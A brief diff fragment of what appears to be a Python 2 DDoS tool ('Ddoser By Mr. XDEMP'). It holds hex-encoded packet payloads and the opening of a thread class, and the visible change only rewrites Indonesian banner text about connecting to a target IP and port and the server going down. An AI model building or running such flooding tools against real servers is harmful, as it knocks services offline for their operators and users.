@@ -13,9 +13,9 @@ Pacotes = [
  codecs.decode('081e4dda', 'hex_codec'),
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
-print ' \x1b[1m\x1b[31mAttacking By Mr. XDEMP'
+print ' \x1b[1m\x1b[31mDdoser By Mr. XDEMP'
 print ' TERHUBUNG DI IP %s DAN DI PORT %s             ' % (orgip, port) 
-print ' JARINGAN ERROR/MATI WAKTU....'
+print ' SAMBUNGAN TERPUTUS/SERVER ERRORS....'
 class MyThread(threading.Thread):
 
     def run(self):
